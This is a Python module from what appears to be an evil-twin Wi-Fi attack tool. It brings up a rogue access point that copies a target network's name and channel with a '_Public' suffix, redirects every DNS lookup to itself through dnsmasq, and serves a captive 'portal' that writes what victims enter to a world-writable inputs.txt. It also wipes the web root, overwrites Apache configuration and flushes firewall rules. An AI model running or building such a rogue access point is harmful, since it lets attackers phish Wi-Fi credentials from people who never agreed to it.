from time import sleep
from scapy.all import *
import settings
import os

def cleanup():
    settings.system_operation(f'iptables -F')
    settings.system_operation(f'iptables -t nat -F')
    settings.system_operation(f'iptables -t mangle -F')
    settings.system_operation(f'iptables --delete-chain')
    settings.system_operation(f'iptables -t nat --delete-chain')
    settings.system_operation(f'iptables -t mangle --delete-chain')
    settings.system_operation('killall hostapd dnsmasq')

    settings.system_operation(f'iw dev {settings.hosting} del')
    
def configurate():
    try:
        settings.system_operation(f'iw dev {settings.monitor} interface add {settings.monitor}_1 type monitor')
        settings.hosting = settings.monitor + '_1'
        settings.system_operation(f'ifconfig {settings.hosting} up 10.0.0.1 netmask 255.255.255.0')
        settings.system_operation(f'route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1')
        settings.system_operation(f'rm -rf /var/www/html/*')
        settings.system_operation(f'cp -rf ./conf/portal/* /var/www/html')
        settings.system_operation('chmod 777 /var/www/html/inputs.txt')
        

        settings.system_operation('cat conf/apache.conf > /etc/apache2/sites-available/000-default.conf')
        settings.system_operation('cat conf/apache.conf > /etc/apache2/sites-enabled/000-default.conf')
        settings.system_operation('cat conf/android.conf > /etc/apache2/sites-enabled/android.conf')

        settings.system_operation(f'iptables -t nat --append POSTROUTING --out-interface {settings.internet} -j MASQUERADE')
        settings.system_operation(f'iptables --append FORWARD --in-interface {settings.hosting} -j ACCEPT')
        settings.system_operation('echo 1 > /proc/sys/net/ipv4/ip_forward')

        settings.system_operation('a2enmod rewrite > /dev/null 2>&1')
        settings.system_operation('systemctl restart apache2')
        settings.system_operation('service apache2 start')
        
    except:
        print('failed to set pre-configurations for Fake Access Point...')
        exit(-1)

    

def fake_ap_configuration():
    dnsmasq_conf =    f"interface={settings.hosting}\n" \
                    + "dhcp-range=10.0.0.2, 10.0.0.30, 12h\n" \
                    + "dhcp-option=3, 10.0.0.1\n" \
                    + "dhcp-option=6, 10.0.0.1\n" \
                    + "server=8.8.8.8\n" \
                    + "listen-address=127.0.0.1\n" \
                    + "address=/#/10.0.0.1"

    hostapd_conf =    f"interface={settings.hosting}\n" \
                    + f"ssid={settings.ap_name}_Public\n" \
                    + "driver=nl80211\n" \
                    + "hw_mode=g\n" \
                    + f"channel={settings.ap_list[settings.ap_name][1]}\n" \
                    + "macaddr_acl=0\n" \
                    + "ignore_broadcast_ssid=0"
                    
    try:
        with open('./conf/dnsmasq.conf', 'w') as fdns:
            fdns.write(dnsmasq_conf)
            fdns.close()
        with open('./conf/hostapd.conf', 'w') as fhost:
            fhost.write(hostapd_conf)
            fhost.close()
    except:
        print("Couldn't write configuration files")

def fake_ap_reconfiguration(iface):
    dnsmasq_conf =    f"interface={iface}\n" \
                    + "dhcp-range=10.0.0.2, 10.0.0.30, 12h\n" \
                    + "dhcp-option=3, 10.0.0.1\n" \
                    + "dhcp-option=6, 10.0.0.1\n" \
                    + "server=8.8.8.8\n" \
                    + "listen-address=127.0.0.1"
    try:
        with open('./conf/dnsmasq.conf', 'w') as fdns:
            print('new entry!!!!')
            fdns.write(dnsmasq_conf)
            fdns.close()
            settings.system_operation('killall dnsmasq')
            sleep(3)
            settings.system_operation('dnsmasq -C conf/dnsmasq.conf')
    except:
        print("Couldn't manipulate dnsmasq configuration file")
